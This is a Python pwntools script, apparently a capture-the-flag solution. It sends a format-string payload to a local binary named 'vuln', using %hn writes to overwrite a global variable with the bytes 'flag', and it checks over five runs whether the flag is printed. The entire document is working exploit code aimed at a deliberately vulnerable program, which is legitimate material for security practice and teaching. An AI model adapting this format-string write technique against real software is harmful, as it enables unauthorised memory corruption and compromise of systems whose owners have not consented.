#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

sus_addr = 0x404060
val_low = 0x6c66   # 27750
val_high = 0x6761  # 26465
addr_low = sus_addr
addr_high = sus_addr + 2

success_count = 0
total_runs = 5

for run in range(total_runs):
    p = process('./vuln')
    p.recvuntil(b'What do you have to say?\n')
    
    # Construir payload
    fs1 = f'%{val_high}c'.encode()
    fs1 += f'%18$hn'.encode()
    
    fs2 = f'%{val_low - val_high}c'.encode()
    fs2 += f'%19$hn'.encode()
    
    payload = fs1 + fs2
    current_len = len(payload)
    padding_needed = (8 - (current_len % 8)) % 8
    payload += b'A' * padding_needed
    payload += p64(addr_high)
    payload += p64(addr_low)
    
    p.sendline(payload)
    
    try:
        response = p.recvall(timeout=3).decode()
        if "I have NO clue" in response and "test_flag" in response:
            success_count += 1
            print(f"Run {run+1}: SUCCESS")
        else:
            print(f"Run {run+1}: FAILED")
            print(f"Response snippet: {response[-200:]}")
    except Exception as e:
        print(f"Run {run+1}: ERROR - {e}")
    
    p.close()

print(f"\nSuccess rate: {success_count}/{total_runs}")
